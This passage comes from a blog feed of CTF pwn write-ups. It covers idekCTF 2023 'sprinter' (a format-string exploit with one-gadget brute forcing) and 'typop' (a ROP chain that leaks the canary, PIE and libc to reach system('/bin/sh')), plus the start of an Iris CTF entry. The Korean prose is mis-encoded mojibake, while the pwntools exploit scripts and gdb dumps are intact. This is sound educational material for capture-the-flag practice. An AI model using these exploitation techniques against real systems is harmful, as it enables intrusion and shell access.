0x00000000004012fd</span><br></pre></td></tr></table></figure><p><code>canary</code> ë³´ì¡´ì— ì„±ê³µí–ˆìœ¼ë©´ <code>rbp</code>ë¥¼ ë®ê³  <code>ret</code>ë¥¼ ì›í•˜ëŠ” ê³³ìœ¼ë¡œ ëŒë ¤ì£¼ë©´ ëì´ë‹¤.</p><h3 id="2-retë¥¼-ë®ì–´-íë¦„-ë³€ê²½í•˜ê¸°"><a href="#2-retë¥¼-ë®ì–´-íë¦„-ë³€ê²½í•˜ê¸°" class="headerlink" title="2. retë¥¼ ë®ì–´ íë¦„ ë³€ê²½í•˜ê¸°"></a>2. <code>ret</code>ë¥¼ ë®ì–´ íë¦„ ë³€ê²½í•˜ê¸°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;AAA%5$261c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>  <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp</span></span><br><span class="line">payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line"><span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)        <span class="comment"># 10 canary</span></span><br><span class="line">payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)  <span class="comment"># 11 libc</span></span><br><span class="line">payload += p64(stack_leak)             <span class="comment"># 12 stack</span></span><br></pre></td></tr></table></figure><p><code>sprintf(buf, buf);</code>ìœ¼ë¡œ <code>FSB</code>ê°€ íŠ¸ë¦¬ê±° ë  ë•Œ ìµìŠ¤í•˜ëŠ” ê²ƒì—ì„œ ê°€ìž¥ ê¹Œë‹¤ë¡œìš´ ì ì€ íŽ˜ì´ë¡œë“œë¥¼ ì ì–´ë†“ì€ <code>buf</code>ê°€ í¬ë§·ìŠ¤íŠ¸ë§ì— ì˜í•´ ë®íž ê°€ëŠ¥ì„±ì´ ì¡´ìž¬í•œë‹¤ëŠ” ê²ƒì´ë‹¤. ê·¸ëž˜ì„œ ìš°ë¦¬ëŠ” ì‹¤í–‰í•˜ê³  ì‹¶ì€ ì£¼ì†Œë¥¼ íŽ˜ì´ë¡œë“œ ì œì¼ ì•žì— ì ì–´ì£¼ì–´ ë®ížˆì§€ ì•Šê²Œ í•´ì•¼ í•œë‹¤. </p><p><code>ret</code> ë¶€ë¶„ì˜ í¬ë§·ìŠ¤íŠ¸ë§ì„ í•´ì„í•´ë³´ë©´ 12ë²ˆì§¸ ì˜¤í”„ì…‹ì—ì„œ 3ë°”ì´íŠ¸ë¥¼ ê°€ì ¸ì˜¤ê³  11ë²ˆì§¸ ì˜¤í”„ì…‹ì—ì„œ 5ë°”ì´íŠ¸ë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. 12ë²ˆì§¸ ì˜¤í”„ì…‹ì—ëŠ” ìŠ¤íƒ ì£¼ì†Œê°€ ì í˜€ì ¸ ìžˆìœ¼ë©° íŽ˜ì´ë¡œë“œ ì²« ë¶€ë¶„ 3ë°”ì´íŠ¸ë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. 11ë²ˆì§¸ ì˜¤í”„ì…‹ì€ libc ì£¼ì†Œê°€ ì €ìž¥ë˜ì–´ ìžˆëŠ”ë° ì •í™•í•œ ê°’ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f 78 55 18 d0 83</span><br></pre></td></tr></table></figure><p><code>aslr</code> ë•Œë¬¸ì— í•˜ìœ„ 1.5ë°”ì´íŠ¸ë¥¼ ì œì™¸í•˜ê³  ê³„ì† ë³€ê²½ëœë‹¤. ìš°ë¦¬ê°€ ì‚¬ìš©í•  <code>one gadget</code> offsetì€ 3ë°”ì´íŠ¸ì´ë¯€ë¡œ 5ë°”ì´íŠ¸ë§Œ ì •í™•í•œ ê°’ì„ ì“°ê³  ë‚˜ë¨¸ì§€ 3ë°”ì´íŠ¸ë¥¼ <code>one gadget</code> offsetì„ ì‚¬ìš©í•œë‹¤. ë¬¼ë¡  ì´ ê°’ì€ íŽ˜ì´ë¡œë“œ ê°€ìž¥ ì²« ë¶€ë¶„ì— ì í˜€ ìžˆì–´ì•¼ í•œë‹¤. ì¼ë‹¨ ì´ ë¶€ë¶„ì€ <code>AAA</code>ë¡œ ê°’ì„ ì ì–´ë†“ê³  3 ê¸€ìž ì¼ê¸° ë•Œë¬¸ì— <code>%264c</code>ë¥¼ <code>%261c</code>ë¡œ ë³€ê²½í•˜ì˜€ë‹¤. </p><p>ì´ì œ gdb ìƒìœ¼ë¡œ ë©”ëª¨ë¦¬ë¥¼ ì‚´íŽ´ë³´ìž.</p><ul><li><code>FSB</code> ì¼ìœ¼í‚¤ê¸° ì „</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffd1f0d4bb0â”‚+0x0000: &quot;AAA%5$261c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;       â† $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffd1f0d4bb8â”‚+0x0008: &quot;1c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc0â”‚+0x0010: &quot;0$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc8â”‚+0x0018: &quot;%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bd0â”‚+0x0020: 0x0073352e243131 (&quot;11$.5s&quot;?)</span><br><span class="line">0x007ffd1f0d4bd8â”‚+0x0028: 0x007ffd1f0d4cb9  â†’  0xd0edc89128c0bcb7</span><br><span class="line">0x007ffd1f0d4be0â”‚+0x0030: 0x007ffd1f0d4cdb  â†’  0x00001800007f7855</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> ì¼ìœ¼í‚¨ í›„</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x7ffd1f0d4bb0: 0x2020202020414141      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4be0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4ca0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4cb0: 0x4120202020202020      0xedc89128c0bcb700</span><br><span class="line">0x7ffd1f0d4cc0: 0xb020202020202020      0x00007f7855414141</span><br><span class="line">0x7ffd1f0d4cd0: 0x0000000000000000      0x00007f785518d083</span><br></pre></td></tr></table></figure><p><code>ret</code>ê°€ <code>0x00007f7855414141</code>ë¡œ ìž˜ ë³€ì¡° ë˜ì—ˆë‹¤.</p><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 20.44.01.png" width=450/><br><p>ì´ì œ <code>one gadget</code>ì„ ì´ìš©í•˜ì—¬ exploitì„ ì§„í–‰í•´ë³´ìž.</p><h3 id="3-offset-Brute-forcing"><a href="#3-offset-Brute-forcing" class="headerlink" title="3. offset Brute forcing"></a>3. offset Brute forcing</h3><p>ì‚¬ìš©í•  <code>one gadget</code> ì˜¤í”„ì…‹ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p><code>\x01\x3b\x0e</code> ë¥¼ ì‚¬ìš©í•  ê²ƒì¸ë° í•˜ìœ„ 1.5ë°”ì´íŠ¸ ë§ê³ ëŠ” <code>aslr</code> ë•Œë¬¸ì— ì˜¤í”„ì…‹ì´ ëžœë¤ì´ë‹ˆê¹Œ 1&#x2F;4096ì˜ í™•ë¥ ì˜ ë¸Œë£¨íŠ¸í¬ì‹±ì´ í•„ìš”í•˜ë‹¤.</p><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;vuln&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;sprinter.chal.idek.team&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        stack_leak = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;stack_leak : <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary_addr = stack_leak + <span class="number">0x108</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;\x01\xfb\xff%5$261c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%4$c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># padding</span></span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">        payload += p64(canary_addr + <span class="number">1</span>)         <span class="comment"># 10</span></span><br><span class="line">        payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)   <span class="comment"># 11</span></span><br><span class="line">        payload += p64(stack_leak)              <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(</span><br><span class="line">            p.recvn(<span class="number">100</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        ))</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure><br><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 00.29.59.png" width=500/>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (rop)</title>
      <link href="/230116-idekctf2023-typop/"/>
      <url>/230116-idekctf2023-typop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?<br><code>nc typop.chal.idek.team 1337</code></p></blockquote><ul><li>[155 solves &#x2F; 408 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>mitigationì€ ìœ„ì™€ ê°™ê³ , í”„ë¡œê·¸ëž¨ êµ¬ì¡°ëŠ” <code>main</code> í•¨ìˆ˜ì—ì„œ whileë¡œ <code>getFeedback</code> í•¨ìˆ˜ë¥¼ ê³„ì† í˜¸ì¶œí•˜ëŠ” êµ¬ì¡°ì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1E</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>bof</code>ê°€ ë‘ ë²ˆ ë°œìƒí•œë‹¤. <code>win</code> í•¨ìˆ˜ê°€ ì¡´ìž¬í•˜ì§€ë§Œ ì¸ìž ì„¸ ê°œë¥¼ ì»¨íŠ¸ë¡¤ í•´ì•¼í•´ì„œ ì‚¬ìš©í•˜ê¸° ê¹Œë‹¤ë¡­ë‹¤. <code>csu gadget</code>ì„ ì´ìš©í•´ì•¼í•˜ëŠ”ë° <strong><del>ê¸¸ì´ ì œí•œ ë° ëª¨ë“  ë³´í˜¸ê¸°ë²•ì´ ë‹¤ ê±¸ë ¤ìžˆì–´ì„œ <code>got</code>ë¥¼ ë®ì„ ìˆ˜ê°€ ì—†ì–´ ì‚¬ìš©í•˜ê¸°ê°€ ë§¤ìš° ê¹Œë‹¤ë¡­ë‹¤.</del> <mark>(2023.01.18 update)</mark> ì°©ê°í–ˆë‹¤. <code>csu_gadget</code>ìœ¼ë¡œ í’€ì´í•˜ëŠ” ê²ƒì´ ì¸í…ì´ê³  í•´ë‹¹ í’€ì´ëŠ” ì•„ëž˜ ë§í¬ë¡œ í™•ì¸í•  ìˆ˜ ìžˆë‹¤.</strong></p><ul><li><a href="https://jiravvit.github.io/230118-idekctf2023-typop2/">https://jiravvit.github.io/230118-idekctf2023-typop2/</a></li></ul><p>ê·¸ëž˜ì„œ <code>win</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ë°©í–¥ì´ ì•„ë‹Œ ì‰˜ì„ íšë“í•˜ëŠ” ë°©í–¥ìœ¼ë¡œ í’€ì´ë¥¼ ì§„í–‰í–ˆë‹¤. ì²« ë²ˆì§¸ë¡œ í„°ì§€ëŠ” <code>bof</code>ì—ì„œ stack, canary, pieë¥¼ leak í•  ìˆ˜ ìžˆê³  ì´ë¡œ ì¸í•´ <code>rop</code>ë¥¼ ì§„í–‰í•˜ì—¬ libc ì£¼ì†Œ ë˜í•œ êµ¬í•  ìˆ˜ ìžˆë‹¤. ê²°êµ­ ê·¸ëƒ¥ <code>system(&quot;/bin/sh\x00&quot;)</code>ë¥¼ ì‹¤í–‰ì‹œì¼œ ì‰˜ì„ íšë“í•˜ê³  flagë¥¼ ì½ìœ¼ë©´ ëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">e.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span></span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(e.address+<span class="number">0x14d3</span>))</span><br><span class="line">pop_rdi = e.address + <span class="number">0x14d3</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.address + <span class="number">0x1410</span>) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x84420</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Iris CTF 2023 - babyseek (offset)</title>
      <link href="/230109-irisctf2023-babyseek/"/>
      <url>/230109-irisctf2023-babyseek/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>86 Solves (8.4% of users)<br>167 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Iâ€™ll let you seek around my file as far as you want, but you canâ€™t go anywhere since itâ€™s &#x2F;dev&#x2F;null.<br><code>nc ret2libm.chal.irisc.tf 10004</code></p><p>To figure out where things are, you can use the gdb debugger. I recommend using a Docker instance, such as with the Dockerfile provided, to ensure you have an environment that matches the remote server you are attacking.</p><p>Hint!<br>You can find the location of functions in the Global Offset Table by using their name followed by @got.plt - for example, print &amp;â€˜<a href="mailto:&#x66;&#119;&#x72;&#x69;&#116;&#101;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#116;">&#x66;&#119;&#x72;&#x69;&#116;&#101;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#116;</a>â€˜.</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ chal</span><br><span class="line">â”œâ”€â”€ chal.c</span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â””â”€â”€ 